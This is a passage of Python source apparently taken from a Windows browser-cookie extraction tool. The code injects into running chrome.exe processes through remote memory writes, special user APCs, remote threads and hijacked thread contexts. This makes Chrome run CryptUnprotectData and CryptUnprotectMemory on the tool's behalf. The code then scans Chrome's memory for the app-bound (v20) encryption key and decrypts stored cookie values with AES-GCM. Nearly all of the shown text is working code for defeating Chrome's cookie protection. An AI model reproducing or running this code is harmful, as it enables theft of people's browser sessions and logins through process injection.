    k32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
    snap = k32.CreateToolhelp32Snapshot(0x4, 0)
    if not snap or int(snap) == -1:
        return []
    tids: list[int] = []
    try:
        te = THREADENTRY32()
        te.dwSize = ctypes.sizeof(THREADENTRY32)
        if not k32.Thread32First(snap, ctypes.byref(te)):
            return []
        while True:
            if int(te.th32OwnerProcessID) == pid:
                tids.append(int(te.th32ThreadID))
            if not k32.Thread32Next(snap, ctypes.byref(te)):
                break
    finally:
        k32.CloseHandle(snap)
    return tids


class _RemoteUnprotect:
    """CryptUnprotectMemory SAME_PROCESS via special APC. Not CoCreate."""

    def __init__(self, pid: int) -> None:
        self.pid = pid
        self.handle = None
        self.data = None
        self.unprotect_fn = 0
        self.protect_fn = 0
        self.nt_test_alert = 0
        self.threads: list[Any] = []
        self.kernel32: Any = None
        self.ntdll: Any = None
        self.ok = False
        self.changed = 0
        self.queued = 0
        self.last_status = 0
        if os.name != "nt":
            return
        try:
            import ctypes
            from ctypes import wintypes
        except ImportError:
            return
        if not hasattr(ctypes, "WinDLL"):
            return
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
        k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        k32.OpenProcess.restype = wintypes.HANDLE
        k32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
        k32.OpenThread.restype = wintypes.HANDLE
        k32.CloseHandle.argtypes = [wintypes.HANDLE]
        k32.CloseHandle.restype = wintypes.BOOL
        k32.VirtualAllocEx.argtypes = [
            wintypes.HANDLE,
            ctypes.c_void_p,
            ctypes.c_size_t,
            wintypes.DWORD,
            wintypes.DWORD,
        ]
        k32.VirtualAllocEx.restype = ctypes.c_void_p
        k32.WriteProcessMemory.argtypes = [
            wintypes.HANDLE,
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t),
        ]
        k32.WriteProcessMemory.restype = wintypes.BOOL
        k32.ReadProcessMemory.argtypes = [
            wintypes.HANDLE,
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_size_t,
            ctypes.POINTER(ctypes.c_size_t),
        ]
        k32.ReadProcessMemory.restype = wintypes.BOOL
        k32.CreateRemoteThread.argtypes = [
            wintypes.HANDLE,
            ctypes.c_void_p,
            ctypes.c_size_t,
            ctypes.c_void_p,
            ctypes.c_void_p,
            wintypes.DWORD,
            ctypes.POINTER(wintypes.DWORD),
        ]
        k32.CreateRemoteThread.restype = wintypes.HANDLE
        k32.ResumeThread.argtypes = [wintypes.HANDLE]
        k32.ResumeThread.restype = wintypes.DWORD
        k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
        k32.WaitForSingleObject.restype = wintypes.DWORD
        ntdll.NtQueueApcThread.argtypes = [
            wintypes.HANDLE,
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_void_p,
        ]
        ntdll.NtQueueApcThread.restype = ctypes.c_long
        if hasattr(ntdll, "NtQueueApcThreadEx2"):
            ntdll.NtQueueApcThreadEx2.argtypes = [
                wintypes.HANDLE,
                wintypes.HANDLE,
                wintypes.ULONG,
                ctypes.c_void_p,
                ctypes.c_void_p,
                ctypes.c_void_p,
                ctypes.c_void_p,
            ]
            ntdll.NtQueueApcThreadEx2.restype = ctypes.c_long
        access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000
        handle = k32.OpenProcess(access, False, pid)
        if not handle:
            return
        unprotect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectMemory")
        protect_fn = _remote_export_addr(k32, handle, "crypt32.dll", "CryptProtectMemory")
        nt_test_alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
        data = k32.VirtualAllocEx(handle, None, 1024, 0x3000, 0x04)
        if not data:
            data = k32.VirtualAllocEx(handle, None, 640, 0x3000, 0x04)
        if not unprotect_fn or not data:
            k32.CloseHandle(handle)
            return
        thread_access = 0x0010 | 0x0002 | 0x0040
        opened: list[Any] = []
        for tid in _threads_for_pid(pid)[:32]:
            th = k32.OpenThread(thread_access, False, tid)
            if th:
                opened.append(th)
            if len(opened) >= 8:
                break
        self.kernel32 = k32
        self.ntdll = ntdll
        self.handle = handle
        self.data = int(data)
        self.unprotect_fn = int(unprotect_fn)
        self.protect_fn = int(protect_fn or 0)
        self.nt_test_alert = int(nt_test_alert or 0)
        self.threads = opened
        self.ok = True

    def _readn(self, addr: int, n: int) -> bytes | None:
        import ctypes

        out = (ctypes.c_char * n)()
        got = ctypes.c_size_t(0)
        if not self.kernel32.ReadProcessMemory(
            self.handle, addr, out, n, ctypes.byref(got)
        ):
            return None
        if int(got.value) != n:
            return None
        return bytes(out)

    def _read32(self, addr: int) -> bytes | None:
        return self._readn(addr, 32)

    def _wait_changed(self, addr: int, before: bytes, timeout: float = 0.03) -> bytes | None:
        deadline = time.monotonic() + timeout
        last: bytes | None = None
        n = len(before) if before else 32
        while time.monotonic() < deadline:
            last = self._readn(addr, n)
            if last and last != before:
                return last
            time.sleep(0.01)
        return last

    def _apc(self, pfn: int, addr: int, cb: int = 32) -> bool:
        """Queue CryptUnprotect/ProtectMemory(addr, cb, SAME_PROCESS=0) in chrome."""
        if not pfn or not addr or cb < 16 or cb % 16:
            return False
        import ctypes
        from ctypes import wintypes

        ntdll = self.ntdll
        k32 = self.kernel32
        # Chrome encryptor.cc: CryptProtectMemory(..., CRYPTPROTECTMEMORY_SAME_PROCESS).
        # CROSS_PROCESS (1) leaves the v20 key wrapped — 765d4c5 never returned a key.
        same_process = ctypes.c_void_p(0)
        cb32 = ctypes.c_void_p(cb)
        special = 1  # QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
        queued = False
        last = 0
        if hasattr(ntdll, "NtQueueApcThreadEx2"):
            for th in self.threads:
                status = int(
                    ntdll.NtQueueApcThreadEx2(
                        th, None, special, pfn, addr, cb32, same_process
                    )
                )
                last = status
                if status >= 0:
                    queued = True
        if not queued:
            for th in self.threads:
                status = int(
                    ntdll.NtQueueApcThread(th, pfn, addr, cb32, same_process)
                )
                last = status
                if status >= 0:
                    queued = True
                    break
        if not queued and self.nt_test_alert:
            tid = wintypes.DWORD(0)
            thread = k32.CreateRemoteThread(
                self.handle, None, 0, self.nt_test_alert, None, 0x4, ctypes.byref(tid)
            )
            if thread:
                try:
                    status = int(
                        ntdll.NtQueueApcThread(
                            thread, pfn, addr, cb32, same_process
                        )
                    )
                    last = status
                    if status >= 0:
                        k32.ResumeThread(thread)
                        k32.WaitForSingleObject(thread, 200)
                        queued = True
                finally:
                    k32.CloseHandle(thread)
        self.last_status = last
        if queued:
            self.queued += 1
        return queued

    def unprotect(self, blob: bytes) -> bytes | None:
        if not self.ok or not blob or len(blob) < 16 or len(blob) % 16 or len(blob) > 1024:
            return None
        import ctypes

        n = len(blob)
        wrote = ctypes.c_size_t(0)
        src = ctypes.create_string_buffer(blob, n)
        if not self.kernel32.WriteProcessMemory(
            self.handle, self.data, src, n, ctypes.byref(wrote)
        ):
            return None
        if not self._apc(self.unprotect_fn, self.data, n):
            return None
        wait_s = 0.15 if len(blob) > 64 else 0.03
        plain = self._wait_changed(self.data, blob, timeout=wait_s)
        if plain and plain != blob:
            self.changed += 1
            return plain
        return None

    def unprotect_at(self, addr: int, n: int = 32) -> bytes | None:
        """In-place CryptUnprotectMemory on chrome's key_ bytes, then re-protect."""
        if not self.ok or not addr or n not in {32, 48, 64}:
            return None
        before = self._readn(addr, n)
        if not before or not _high_entropy32(before[:32]):
            return None
        if not self._apc(self.unprotect_fn, addr, n):
            return None
        plain = self._wait_changed(addr, before)
        if self.protect_fn:
            self._apc(self.protect_fn, addr, n)
        if plain and plain != before:
            self.changed += 1
            return plain
        return None

    def close(self) -> None:
        if self.kernel32:
            for th in self.threads:
                try:
                    self.kernel32.CloseHandle(th)
                except Exception:  # noqa: BLE001
                    pass
            self.threads = []
            if self.handle:
                try:
                    self.kernel32.CloseHandle(self.handle)
                except Exception:  # noqa: BLE001
                    pass
        self.handle = None
        self.ok = False


def _chrome_unprotect_memory_blob(blob: bytes) -> bytes | None:
    """APC CryptUnprotectMemory on the 640-byte APPB body inside chrome."""
    if os.name != "nt" or not blob:
        return None
    raw = blob[4:] if blob.startswith(b"APPB") else blob
    if len(raw) < 16:
        return None
    padded = raw + (b"\x00" * ((16 - len(raw) % 16) % 16))
    if len(padded) > 1024:
        padded = padded[:1024]
        padded = padded[: len(padded) - (len(padded) % 16)]
    for pid in _chrome_pids_prioritized()[:6]:
        remote = _RemoteUnprotect(pid)
        if not remote.ok:
            continue
        try:
            plain = remote.unprotect(padded)
            if plain and plain != padded:
                return plain[: len(raw)] if len(plain) >= len(raw) else plain
        finally:
            remote.close()
    return None


def _chrome_unprotect_data(blob: bytes) -> bytes | None:
    """CryptUnprotectData inside chrome.exe (CFG-valid export, not CoCreate)."""
    if os.name != "nt" or not blob:
        return None
    payloads = _dpapi_blob_slices(blob)
    if not payloads:
        raw = blob[4:] if blob.startswith(b"APPB") else blob
        payloads = [raw] if raw else []
    for payload in payloads[:2]:
        if len(payload) < 24 or len(payload) > 3000:
            continue
        for flags in (0, 1):
            plain = _chrome_unprotect_data_once(payload, flags)
            if plain:
                return plain
    return None


def _chrome_unprotect_data_once(raw: bytes, flags: int) -> bytes | None:
    """One CryptUnprotectData call in chrome. 7th stack arg is pDataOut @+0x38."""
    try:
        import ctypes
        from ctypes import wintypes
    except ImportError:
        return None

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", wintypes.DWORD),
            ("pbData", ctypes.c_void_p),
        ]

    # AMD64 CONTEXT integer/control field offsets (winnt.h).
    ctx_flags, ctx_rcx, ctx_rdx = 0x30, 0x80, 0x88
    ctx_rsp, ctx_r8, ctx_r9, ctx_rip = 0x98, 0xB8, 0xC0, 0xF8
    ctx_size = 1232
    context_integer_control = 0x100003

    if not hasattr(ctypes, "WinDLL"):
        return None
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    k32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    k32.GetThreadContext.restype = wintypes.BOOL
    k32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.c_void_p]
    k32.SetThreadContext.restype = wintypes.BOOL
    k32.TerminateThread.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    k32.TerminateThread.restype = wintypes.BOOL
    k32.ResumeThread.argtypes = [wintypes.HANDLE]
    k32.ResumeThread.restype = wintypes.DWORD
    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
    k32.WaitForSingleObject.restype = wintypes.DWORD
    k32.CreateRemoteThread.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.c_void_p,
        ctypes.c_void_p,
        wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD),
    ]
    k32.CreateRemoteThread.restype = wintypes.HANDLE
    k32.VirtualAllocEx.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_size_t,
        wintypes.DWORD,
        wintypes.DWORD,
    ]
    k32.VirtualAllocEx.restype = ctypes.c_void_p
    k32.WriteProcessMemory.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t),
    ]
    k32.WriteProcessMemory.restype = wintypes.BOOL
    k32.ReadProcessMemory.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t),
    ]
    k32.ReadProcessMemory.restype = wintypes.BOOL
    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    k32.OpenProcess.restype = wintypes.HANDLE
    k32.CloseHandle.argtypes = [wintypes.HANDLE]
    k32.CloseHandle.restype = wintypes.BOOL
    access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000
    for pid in _chrome_pids_prioritized()[:4]:
        handle = k32.OpenProcess(access, False, pid)
        if not handle:
            continue
        try:
            decrypt = _remote_export_addr(k32, handle, "crypt32.dll", "CryptUnprotectData")
            exit_fn = _remote_export_addr(k32, handle, "kernel32.dll", "ExitThread")
            alert = _remote_export_addr(k32, handle, "ntdll.dll", "NtTestAlert")
            if not decrypt or not exit_fn:
                continue
            page = k32.VirtualAllocEx(handle, None, 4096, 0x3000, 0x04)
            if not page:
                continue
            page = int(page)
            in_blob_addr = page
            out_blob_addr = page + 16
            data_addr = page + 64
            stack_addr = page + 2048
            in_blob = DATA_BLOB(len(raw), data_addr)
            out_blob = DATA_BLOB(0, 0)
            wrote = ctypes.c_size_t(0)
            if not k32.WriteProcessMemory(
                handle, in_blob_addr, ctypes.byref(in_blob), ctypes.sizeof(in_blob), ctypes.byref(wrote)
            ):
                continue
            if not k32.WriteProcessMemory(
                handle, out_blob_addr, ctypes.byref(out_blob), ctypes.sizeof(out_blob), ctypes.byref(wrote)
            ):
                continue
            src = (ctypes.c_ubyte * len(raw)).from_buffer_copy(raw)
            if not k32.WriteProcessMemory(handle, data_addr, src, len(raw), ctypes.byref(wrote)):
                continue
            # Enter as if just `call`ed: [RSP]=ExitThread, RSP%16==8.
            rsp = ((stack_addr + 512) & ~0xF) - 8
            stack = bytearray(64)
            stack[0:8] = int(exit_fn).to_bytes(8, "little")
            # 5th pPrompt @+0x28, 6th dwFlags @+0x30, 7th pDataOut @+0x38
            stack[0x28:0x30] = (0).to_bytes(8, "little")
            stack[0x30:0x38] = int(flags).to_bytes(8, "little")
            stack[0x38:0x40] = int(out_blob_addr).to_bytes(8, "little")
            if not k32.WriteProcessMemory(
                handle, rsp, ctypes.create_string_buffer(bytes(stack), 64), 64, ctypes.byref(wrote)
            ):
                continue
            tid = wintypes.DWORD(0)
            start = alert or decrypt
            thread = k32.CreateRemoteThread(
                handle, None, 0, start, None, 0x4, ctypes.byref(tid)
            )
            if not thread:
                continue
            try:
                ctx = (ctypes.c_char * ctx_size)()
                ctx_flag_bytes = context_integer_control.to_bytes(4, "little")
                ctx[ctx_flags : ctx_flags + 4] = ctx_flag_bytes
                if not k32.GetThreadContext(thread, ctx):
                    k32.TerminateThread(thread, 0)
                    continue
                ctx[ctx_rcx : ctx_rcx + 8] = int(in_blob_addr).to_bytes(8, "little")
                ctx[ctx_rdx : ctx_rdx + 8] = (0).to_bytes(8, "little")
                ctx[ctx_r8 : ctx_r8 + 8] = (0).to_bytes(8, "little")
                ctx[ctx_r9 : ctx_r9 + 8] = (0).to_bytes(8, "little")
                ctx[ctx_rsp : ctx_rsp + 8] = int(rsp).to_bytes(8, "little")
                ctx[ctx_rip : ctx_rip + 8] = int(decrypt).to_bytes(8, "little")
                ctx[ctx_flags : ctx_flags + 4] = ctx_flag_bytes
                if not k32.SetThreadContext(thread, ctx):
                    k32.TerminateThread(thread, 0)
                    continue
                k32.ResumeThread(thread)
                if k32.WaitForSingleObject(thread, 2000) != 0:
                    k32.TerminateThread(thread, 0)
                    continue
            finally:
                k32.CloseHandle(thread)
            out_raw = (ctypes.c_char * ctypes.sizeof(out_blob))()
            if not k32.ReadProcessMemory(
                handle, out_blob_addr, out_raw, ctypes.sizeof(out_blob), ctypes.byref(wrote)
            ):
                continue
            got = DATA_BLOB.from_buffer_copy(out_raw)
            if not got.cbData or not got.pbData or int(got.cbData) > 4096:
                continue
            plain = (ctypes.c_char * int(got.cbData))()
            if not k32.ReadProcessMemory(
                handle, int(got.pbData), plain, int(got.cbData), ctypes.byref(wrote)
            ):
                continue
            return bytes(plain)
        except (AttributeError, OSError, ValueError, TypeError, OverflowError):
            continue
        finally:
            k32.CloseHandle(handle)
    return None


def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
    """Browser/network only. Follow Chrome 151 key layouts; verify a v20 blob."""
    if os.name != "nt":
        return None, "memscan:not_nt"
    if not _valid_v20_sample(v20_sample):
        return None, "memscan:no_v20_sample"
    try:
        import ctypes
        from ctypes import wintypes
    except ImportError:
        return None, "memscan:no_ctypes"
    pids = _chrome_pids_prioritized()
    if not pids:
        return None, "memscan:no_chrome"
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    kernel32.OpenProcess.restype = wintypes.HANDLE
    kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
    kernel32.CloseHandle.restype = wintypes.BOOL
    kernel32.ReadProcessMemory.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_size_t),
    ]
    kernel32.ReadProcessMemory.restype = wintypes.BOOL

    class MEMORY_BASIC_INFORMATION(ctypes.Structure):
        _fields_ = [
            ("BaseAddress", ctypes.c_uint64),
            ("AllocationBase", ctypes.c_uint64),
            ("AllocationProtect", wintypes.DWORD),
            ("_pad", wintypes.DWORD),
            ("RegionSize", ctypes.c_uint64),
            ("State", wintypes.DWORD),
            ("Protect", wintypes.DWORD),
            ("Type", wintypes.DWORD),
        ]

    kernel32.VirtualQueryEx.argtypes = [
        wintypes.HANDLE,
        ctypes.c_void_p,
        ctypes.POINTER(MEMORY_BASIC_INFORMATION),
        ctypes.c_size_t,
    ]
    kernel32.VirtualQueryEx.restype = ctypes.c_size_t

    def readn(handle: Any, addr: int, n: int) -> bytes | None:
        buf = (ctypes.c_char * n)()
        got = ctypes.c_size_t(0)
        if not kernel32.ReadProcessMemory(
            handle, ctypes.c_void_p(addr), buf, n, ctypes.byref(got)
        ):
            return None
        if int(got.value) != n:
            return None
        return bytes(buf)

    deadline = time.monotonic() + _ABE_MEMSCAN_TIMEOUT_S
    scanned = 0
    tried = 0
    opened = 0
    unprotect_ok = 0
    apc_changed = 0
    apc_queued = 0
    apc_status = 0
    found_ptrs = 0
    seen: set[bytes] = set()
    PROCESS_VM_READ = 0x0010
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_QUERY_LIMITED = 0x1000
    MEM_COMMIT = 0x1000
    MEM_PRIVATE = 0x20000
    MEM_MAPPED = 0x40000
    MEM_IMAGE = 0x1000000
    PAGE_GUARD = 0x100
    allowed_prot = {0x02, 0x04, 0x08, 0x40}
    mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)

    def apc_extra() -> str:
        if not unprotect_ok:
            return ";apc:setup"
        if apc_queued == 0:
            return f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:0"
        if apc_changed == 0:
            return ";apc:0"
        return ";apc:ok"

    def consider_raw(cand: bytes | None) -> bytes | None:
        nonlocal tried
        if not cand or cand in seen or not _high_entropy32(cand):
            return None
        seen.add(cand)
        tried += 1
        if _v20_key_ok(cand, v20_sample, all_blobs=True):
            return cand
        return None

    def consider_apc(
        cand: bytes | None,
        unprotect: _RemoteUnprotect | None,
        addr: int | None,
        extra: bytes | None = None,
    ) -> bytes | None:
        if unprotect is None or not unprotect.ok or not cand:
            return None
        blobs = [cand]
        if extra and extra not in blobs:
            blobs.append(extra)
        for blob in blobs:
            if len(blob) >= 32:
                blob = blob[:32]
            else:
                continue
            plain = unprotect.unprotect(blob)
            hit = _abe_key_from_material(plain, v20_sample)
            if hit:
                return hit
            if addr:
                inplace = unprotect.unprotect_at(addr, 32)
                hit = _abe_key_from_material(inplace, v20_sample)
                if hit:
                    return hit
        return None

    for pid in pids:
        if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
            break
        handle = kernel32.OpenProcess(
            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED,
            False,
            pid,
        )
        if not handle:
            handle = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not handle:
            continue
        opened += 1
        unprotect = _RemoteUnprotect(pid)
        if unprotect.ok:
            unprotect_ok += 1
        try:
            addr = 0
            while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
                if time.monotonic() > deadline or tried >= _ABE_MEMSCAN_MAX_CAND:
                    break
                mbi = MEMORY_BASIC_INFORMATION()
                q = int(
                    kernel32.VirtualQueryEx(
                        handle, ctypes.c_void_p(addr), ctypes.byref(mbi), mbi_size
                    )
                )
                if q == 0:
                    break
                size = int(mbi.RegionSize)
                if size <= 0:
                    break
                prot = int(mbi.Protect)
                mtype = int(mbi.Type)
                type_ok = mtype in {MEM_PRIVATE, MEM_MAPPED} or (
                    mtype == MEM_IMAGE and (prot & 0xFF) in {0x04, 0x08}
                )
                usable = (
                    int(mbi.State) == MEM_COMMIT
                    and type_ok
                    and (prot & PAGE_GUARD) == 0
                    and (prot & 0xFF) in allowed_prot
                    and size <= _ABE_MEMSCAN_MAX_REGION
                )
                if usable:
                    n = min(size, _ABE_MEMSCAN_MAX_REGION)
                    raw = (ctypes.c_char * n)()
                    got = ctypes.c_size_t(0)
                    if kernel32.ReadProcessMemory(
                        handle, ctypes.c_void_p(int(mbi.BaseAddress)), raw, n, ctypes.byref(got)
                    ) and int(got.value) >= 16:
                        data = bytes(raw[: int(got.value)])
                        scanned += len(data)
                        seen_ptr: set[int] = set()

                        def take_blob(ptr: int) -> tuple[bytes, bytes] | None:
                            blob = readn(handle, ptr, 32)
                            if not blob:
                                return None
                            extra = readn(handle, ptr, 64) or blob
                            return blob, extra

                        # In-scan APC (f980476): do not defer past the 6s deadline.
                        for ptr in _keyring_v20_key_ptrs(data):
                            if ptr in seen_ptr:
                                continue
                            seen_ptr.add(ptr)
                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                break
                            got_blob = take_blob(ptr)
                            if not got_blob:
                                continue
                            blob, extra = got_blob
                            found_ptrs += 1
                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
                                hit = consider_raw(cand)
                                if hit:
                                    return hit, "ok"
                            hit = consider_apc(blob, unprotect, ptr, extra)
                            if hit:
                                return hit, "ok"
                        for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                            if ptr in seen_ptr:
                                continue
                            seen_ptr.add(ptr)
                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                break
                            got_blob = take_blob(ptr)
                            if not got_blob:
                                continue
                            blob, extra = got_blob
                            found_ptrs += 1
                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
                                hit = consider_raw(cand)
                                if hit:
                                    return hit, "ok"
                            hit = consider_apc(blob, unprotect, ptr, extra)
                            if hit:
                                return hit, "ok"
                nxt = addr + size
                if nxt <= addr:
                    break
                addr = nxt
        finally:
            apc_changed += int(unprotect.changed)
            apc_queued += int(unprotect.queued)
            if unprotect.last_status:
                apc_status = int(unprotect.last_status)
            unprotect.close()
            kernel32.CloseHandle(handle)
    extra = apc_extra()
    fp = str(_cache.get("_appb_fp") or "")
    if fp:
        extra = f"{extra};{fp}"
    if opened == 0:
        return None, f"memscan:OpenProcess{extra}"
    if tried == 0:
        if found_ptrs:
            return None, f"memscan:cands={found_ptrs}{extra}"
        return None, f"memscan:no_cand{extra}"
    return None, f"memscan:no_key:{tried}{extra}"


def _find_csc() -> Path | None:
    windir = os.environ.get("WINDIR") or r"C:\Windows"
    candidates = [
        Path(windir) / "Microsoft.NET" / "Framework64" / "v4.0.30319" / "csc.exe",
        Path(windir) / "Microsoft.NET" / "Framework" / "v4.0.30319" / "csc.exe",
    ]
    for path in candidates:
        if path.is_file():
            return path
    return None


def _chrome_application_dirs() -> list[Path]:
    found: list[Path] = []
    seen: set[str] = set()

    def add(path: Path) -> None:
        try:
            path = path.resolve()
        except OSError:
            return
        if path.is_file() and path.name.lower() == "chrome.exe":
            path = path.parent
        if not path.is_dir() or not (path / "chrome.exe").is_file():
            return
        key = str(path).replace("/", "\\").casefold()
        if key in seen:
            return
        seen.add(key)
        found.append(path)

    for env_name in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
        root = os.environ.get(env_name) or ""
        if not root:
            continue
        app = Path(root) / "Google" / "Chrome" / "Application"
        add(app / "chrome.exe")
        try:
            for child in app.iterdir():
                add(child / "chrome.exe")
        except OSError:
            continue
    add(_chrome_exe_from_registry())
    return found


def _chrome_exe_from_registry() -> Path:
    if os.name != "nt":
        return Path()
    try:
        import winreg  # type: ignore[import-not-found]
    except ImportError:
        return Path()
    keys = (
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
        (
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
        ),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"),
    )
    for hive, sub in keys:
        try:
            with winreg.OpenKey(hive, sub) as key:
                val, _ = winreg.QueryValueEx(key, "")
        except OSError:
            continue
        if isinstance(val, str) and val.strip():
            return Path(val.strip())
    return Path()


def _guid(text: str) -> Any:
    import ctypes
    from ctypes import wintypes

    class GUID(ctypes.Structure):
        _fields_ = [
            ("Data1", wintypes.DWORD),
            ("Data2", wintypes.WORD),
            ("Data3", wintypes.WORD),
            ("Data4", ctypes.c_ubyte * 8),
        ]

    g = GUID()
    ctypes.windll.ole32.CLSIDFromString(text, ctypes.byref(g))
    return g


def _decrypt_cookie_value(blob: bytes, keys: _BrowserKeys | bytes | None) -> str:
    if not blob:
        return ""
    if not isinstance(keys, _BrowserKeys):
        keys = _BrowserKeys(abe=keys, v10=keys)
    prefix = blob[:3]
    if prefix == b"v20":
        if not keys.abe:
            return ""
        raw = _aes_gcm_decrypt_bytes(blob[3:], keys.abe)
        return _v20_cookie_text(raw)
    if prefix in (b"v10", b"v11") and keys.v10:
        raw = _aes_gcm_decrypt_bytes(blob[3:], keys.v10)
        if raw:
            try:
                return raw.decode("utf-8")
            except UnicodeDecodeError:
                return ""
    # Older Chrome: the whole blob is DPAPI.
    raw = _dpapi_unprotect(blob)
    if raw:
        try:
            return raw.decode("utf-8")
        except UnicodeDecodeError:
            return ""
    return ""


def _v20_cookie_text(plain: bytes) -> str:
    """v20 cookie plaintext: 32-byte metadata prefix, then the cookie value."""
    if not plain:
        return ""
    candidates = []
    if len(plain) > 32:
        candidates.append(plain[32:])
    candidates.append(plain)
    for chunk in candidates:
        try:
            text = chunk.decode("utf-8")
        except UnicodeDecodeError:
            continue
        if text and "\x00" not in text:
            return text
    return ""


def _aes_gcm_decrypt_bcrypt(payload: bytes, key: bytes) -> bytes:
    """Windows CNG AES-GCM. quoting PC has no cryptography in requirements.txt."""
    if os.name != "nt" or len(payload) < 28 or len(key) not in {16, 24, 32}:
        return b""
    try:
        import ctypes
        from ctypes import wintypes
    except ImportError:
        return b""
    nonce = payload[:12]
    tag = payload[-16:]
    ciphertext = payload[12:-16]
    if not ciphertext:
        return b""

    class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
        _fields_ = [
            ("cbSize", wintypes.ULONG),
            ("dwInfoVersion", wintypes.ULONG),
            ("pbNonce", ctypes.c_void_p),
            ("cbNonce", wintypes.ULONG),
            ("pbAuthData", ctypes.c_void_p),
            ("cbAuthData", wintypes.ULONG),
            ("pbTag", ctypes.c_void_p),
            ("cbTag", wintypes.ULONG),
            ("pbMacContext", ctypes.c_void_p),
            ("cbMacContext", wintypes.ULONG),
            ("cbAAD", wintypes.ULONG),
            ("cbData", ctypes.c_ulonglong),
            ("dwFlags", wintypes.ULONG),
        ]

    try:
        bcrypt = ctypes.WinDLL("bcrypt")
    except (AttributeError, OSError):
        return b""
    h_alg = ctypes.c_void_p()
    h_key = ctypes.c_void_p()
    if int(bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), "AES", None, 0)):
        return b""
    try:
        gcm = ctypes.create_unicode_buffer("ChainingModeGCM")
        if int(
            bcrypt.BCryptSetProperty(
                h_alg, "ChainingMode", gcm, ctypes.sizeof(gcm), 0
            )
        ):
            return b""
        key_buf = ctypes.create_string_buffer(key, len(key))
        if int(
            bcrypt.BCryptGenerateSymmetricKey(
                h_alg, ctypes.byref(h_key), None, 0, key_buf, len(key), 0
            )
        ):
            return b""
        nonce_buf = ctypes.create_string_buffer(nonce, 12)
        tag_buf = ctypes.create_string_buffer(tag, 16)
        ct_buf = ctypes.create_string_buffer(ciphertext, len(ciphertext))
        out_buf = ctypes.create_string_buffer(len(ciphertext))
        info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
        info.cbSize = ctypes.sizeof(info)
        info.dwInfoVersion = 1
        info.pbNonce = ctypes.cast(nonce_buf, ctypes.c_void_p)
        info.cbNonce = 12
        info.pbTag = ctypes.cast(tag_buf, ctypes.c_void_p)
        info.cbTag = 16
        got = wintypes.ULONG(0)
        status = int(
            bcrypt.BCryptDecrypt(
                h_key,
                ct_buf,
                len(ciphertext),
                ctypes.byref(info),
                None,
                0,
                out_buf,
                len(ciphertext),
                ctypes.byref(got),
                0,
            )
        )
        if status != 0 or int(got.value) <= 0:
            return b""
        return out_buf.raw[: int(got.value)]
    except (AttributeError, OSError, TypeError, ValueError):
        return b""
    finally:
        if h_key.value:
            bcrypt.BCryptDestroyKey(h_key)
        if h_alg.value:
            bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)


_AES_SBOX = bytes(
    [
